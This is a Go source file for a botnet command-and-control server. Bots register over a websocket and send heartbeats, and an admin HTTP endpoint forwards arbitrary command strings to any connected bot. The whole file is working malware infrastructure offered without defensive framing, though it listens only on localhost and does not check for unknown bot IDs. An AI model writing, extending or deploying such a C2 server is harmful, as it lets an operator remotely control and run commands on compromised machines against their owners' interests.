package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
)

type Bot struct {
	mu sync.RWMutex

	ID         int    `json:"id"`
	OS         string `json:"os"`
	IP         string `json:"ip"`
	LastSeen   time.Time
	Active     bool
	BotMessage BotMessage
	con        *websocket.Conn
	// Command Command
}

type Command struct {
	BotID int    `json:"id"`
	Cmd   string `json:"cmd"`
}

type BotMessage struct {
	Type    string
	Message string
}

type c2 struct {
	mu   sync.RWMutex
	bots map[int]*Bot
}

func Newc2() *c2 {
	return &c2{
		bots: make(map[int]*Bot),
	}
}

func (c *c2) registerBot(id int, b *Bot) {
	c.mu.Lock()
	defer c.mu.Unlock()

	c.bots[id] = b
}

func (c *c2) getBot(id int) *Bot {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.bots[id]

}

func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
	b := Bot{
		Active: false,
	}

	var con *websocket.Conn
	var err error
	if con, err = websocket.Accept(w, r, nil); err != nil {
		log.Println(err)
		return
	}
	go heartBeat(con, &b)
	defer con.Close(websocket.StatusNormalClosure, "")
	ctx := context.Background()
	if err := wsjson.Read(ctx, con, &b); err != nil {
		log.Println(err)
		return
	}
	b.mu.Lock()
	b.con = con
	b.LastSeen = time.Now()
	b.Active = true
	c.registerBot(b.ID, &b)
	b.mu.Unlock()

	fmt.Print(b.ID, b.IP, b.OS, b.LastSeen)
	for {
		// var botmsg string
		if err := wsjson.Read(ctx, con, &b.BotMessage); err != nil {
			log.Println(err)
			return
		}

		switch b.BotMessage.Type {
		case "heartbeat":
			b.mu.Lock()
			b.LastSeen = time.Now()
			b.mu.Unlock()
		case "whoami":
			fmt.Println("CMD: ", b.BotMessage.Type, " Result: ", b.BotMessage.Message)

		}

	}

}

func heartBeat(con *websocket.Conn, bot *Bot) {

	timer := time.Tick(10 * time.Second)
	inactiveSince := time.Now()

	for range timer {
		bot.mu.Lock()
		lastseen := bot.LastSeen
		active := bot.Active
		bot.mu.Unlock()
		if !active {
			if time.Since(inactiveSince) > 15*time.Second {
				fmt.Println("Closing now...")
				con.CloseNow()
				return
			}
			continue
		}

		if time.Since(lastseen) > 1*time.Minute {
			fmt.Println("Closing now..")
			con.CloseNow()
			return
		}

	}

}

func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
	cmd := Command{}
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println(err)
		return
	}
	json.Unmarshal(body, &cmd)
	// fmt.Println(cmd)
	bot := c.getBot(cmd.BotID)

	if err = wsjson.Write(context.Background(), bot.con, cmd.Cmd); err != nil {
		log.Println(err)
		return
	}

}

func main() {
	var wg sync.WaitGroup
	wg.Add(2)
	c2 := Newc2()
	adminMux := http.NewServeMux()
	adminMux.HandleFunc("/executeCommand", c2.SendCommand)

	botMux := http.NewServeMux()
	botMux.HandleFunc("/connect", c2.connectBot)

	// http.HandleFunc("/executeCommand", c2.SendCommand)
	go func() {
		defer wg.Done()
		if err := http.ListenAndServe("127.0.0.1:9000", adminMux); err != nil {
			log.Println("Admin Server Error : ", err)
		}
	}()

	go func() {
		defer wg.Done()
		if err := http.ListenAndServe("127.0.0.1:4444", botMux); err != nil {
			log.Println("Bot Server Error : ", err)
		}
	}()

	wg.Wait()

}
